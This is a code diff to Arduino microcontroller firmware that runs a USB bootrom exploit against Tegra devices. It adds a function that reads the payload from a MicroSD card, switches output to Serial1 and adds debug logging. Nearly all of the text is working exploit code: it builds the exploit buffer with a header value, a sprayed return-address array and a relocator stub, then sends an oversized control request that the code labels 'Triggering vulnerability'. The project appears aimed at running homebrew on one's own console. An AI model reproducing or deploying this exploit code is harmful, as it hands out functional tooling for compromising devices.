@@ -1,5 +1,9 @@
+// Serial console output set to "Serial1" for Adafruit Feather M0 - set back to "Serial" for Sparkfun boards
+
 #include <Arduino.h>
 #include <usb.h>
+#include <SPI.h>
+#include <SD.h>
 
 // Contains fuseeBin and FUSEE_BIN_LENGTH
 #include "payload.h"
@@ -29,15 +33,23 @@ byte tegraDeviceAddress = -1;
 
 unsigned long lastCheckTime = 0;
 
+bool useSD = false;
+String payloadname = "payload.bin";
+
+// The pin on the microcontroller board connected as the MicroSD card CS (chip select) pin
+// is pin 10 for Adafruit Adalogger FeatherWing
+// is pin 4 for Adafruit Feather M0 Adalogger board
+const int chipSelect = 4;
+
 const char *hexChars = "0123456789ABCDEF";
 void serialPrintHex(const byte *data, byte length)
 {
     for (int i = 0; i < length; i++)
     {
-        Serial.print(hexChars[(data[i] >> 4) & 0xF]);
-        Serial.print(hexChars[data[i] & 0xF]);
+        Serial1.print(hexChars[(data[i] >> 4) & 0xF]);
+        Serial1.print(hexChars[data[i] & 0xF]);
     }
-    Serial.println();
+    Serial1.println();
 }
 
 // From what I can tell, usb.outTransfer is completely broken for transfers larger than 64 bytes (even if maxPktSize is
@@ -68,7 +80,7 @@ void usbOutTransferChunk(uint32_t addr, uint32_t ep, uint32_t nbytes, uint8_t* d
         }
         else
         {
-            Serial.println("Error in OUT transfer");
+            Serial1.println("Error in OUT transfer");
             return;
         }
     }
@@ -94,6 +106,11 @@ void usbBufferedWrite(const byte *data, uint32_t length)
         uint32_t bytesToWrite = min(PACKET_CHUNK_SIZE - usbWriteBufferUsed, length);
         memcpy(usbWriteBuffer + usbWriteBufferUsed, data, bytesToWrite);
         usbWriteBufferUsed += bytesToWrite;
+        Serial1.print("usbBufferedWrite while loop: ");
+        Serial1.print(bytesToWrite);
+        Serial1.print(" bytesToWrite / ");
+        Serial1.print(usbWriteBufferUsed);
+        Serial1.println(" usbWriteBufferUsed");
         usbFlushBuffer();
         data += bytesToWrite;
         length -= bytesToWrite;
@@ -117,7 +134,7 @@ void readTegraDeviceID(byte *deviceID)
     UHD_Pipe_Alloc(tegraDeviceAddress, 0x01, USB_HOST_PTYPE_BULK, USB_EP_DIR_IN, 0x40, 0, USB_HOST_NB_BK_1);
 
     if (usb.inTransfer(tegraDeviceAddress, 0x01, &readLength, deviceID))
-        Serial.println("Failed to get device ID!");
+        Serial1.println("Failed to get device ID!");
 }
 
 void sendPayload(const byte *payload, uint32_t payloadLength)
@@ -136,13 +153,44 @@ void sendPayload(const byte *payload, uint32_t payloadLength)
     usbFlushBuffer();
 }
 
+void sendPayloadSD(String mypayloadname)
+{
+    File payloadfile = SD.open(mypayloadname, FILE_READ);
+    long SDBytesLeft = payloadfile.size();
+    byte dataToSend[PACKET_CHUNK_SIZE];
+    uint32_t SDBytesToWrite;
+
+    byte zeros[0x1000] = {0};
+
+    usbBufferedWriteU32(0x30298);
+    usbBufferedWrite(zeros, 680 - 4);
+
+    for (uint32_t i = 0; i < 0x3C00; i++)
+        usbBufferedWriteU32(0x4001F000);
+
+    usbBufferedWrite(intermezzo, INTERMEZZO_SIZE);
+    usbBufferedWrite(zeros, 0xFA4);
+
+    while (SDBytesLeft > 0)
+    {
+        SDBytesToWrite = min(PACKET_CHUNK_SIZE, SDBytesLeft);
+        digitalWrite(13, HIGH);
+        payloadfile.read(dataToSend, SDBytesToWrite);
+        digitalWrite(13, LOW);
+        usbBufferedWrite(dataToSend, SDBytesToWrite);
+        SDBytesLeft -= PACKET_CHUNK_SIZE;
+    }
+    usbFlushBuffer();
+    payloadfile.close();
+}
+
 void findTegraDevice(UsbDeviceDefinition *pdev)
 {
     uint32_t address = pdev->address.devAddress;
     USB_DEVICE_DESCRIPTOR deviceDescriptor;
     if (usb.getDevDescr(address, 0, 0x12, (uint8_t *)&deviceDescriptor))
     {
-        Serial.println("Error getting device descriptor.");
+        Serial1.println("Error getting device descriptor.");
         return;
     }
 
@@ -179,11 +227,19 @@ void setupTegraDevice()
 void setup()
 {
     usb.Init();
-    Serial.begin(115200);
+    Serial1.begin(115200);
 
     delay(100);
 
-    Serial.println("Ready! Waiting for Tegra...");
+    // check if SD present, if not, use standard payload from payload.h
+    if (SD.begin(chipSelect)) {
+        if (SD.exists(payloadname)) {
+            useSD = true;
+            Serial1.println("Using MicroSD card as payload source.");
+        }
+    }
+
+    Serial1.println("Ready! Waiting for Tegra...");
 
     while (!foundTegra)
     {
@@ -193,29 +249,32 @@ void setup()
             usb.ForEachUsbDevice(&findTegraDevice);
     }
 
-    Serial.println("Found Tegra!");
+    Serial1.println("Found Tegra!");
     setupTegraDevice();
 
     byte deviceID[16] = {0};
     readTegraDeviceID(deviceID);
-    Serial.print("Device ID: ");
+    Serial1.print("Device ID: ");
     serialPrintHex(deviceID, 16);
 
-    Serial.println("Sending payload...");
+    Serial1.println("Sending payload...");
     UHD_Pipe_Alloc(tegraDeviceAddress, 0x01, USB_HOST_PTYPE_BULK, USB_EP_DIR_OUT, 0x40, 0, USB_HOST_NB_BK_1);
     packetsWritten = 0;
-    sendPayload(fuseeBin, FUSEE_BIN_SIZE);
+    if (useSD)
+        sendPayloadSD(payloadname);
+    else
+        sendPayload(fuseeBin, FUSEE_BIN_SIZE);
 
     if (packetsWritten % 2 != 1)
     {
-        Serial.println("Switching to higher buffer...");
+        Serial1.println("Switching to higher buffer...");
         usbFlushBuffer();
     }
 
-    Serial.println("Triggering vulnerability...");
+    Serial1.println("Triggering vulnerability...");
     usb.ctrlReq(tegraDeviceAddress, 0, USB_SETUP_DEVICE_TO_HOST | USB_SETUP_TYPE_STANDARD | USB_SETUP_RECIPIENT_INTERFACE,
         0x00, 0x00, 0x00, 0x00, 0x7000, 0x7000, usbWriteBuffer, NULL);
-    Serial.println("Done!");
+    Serial1.println("Done!");
 
     // Turn off all LEDs and go to sleep. To launch another payload, press the reset button on the device.
     delay(100);
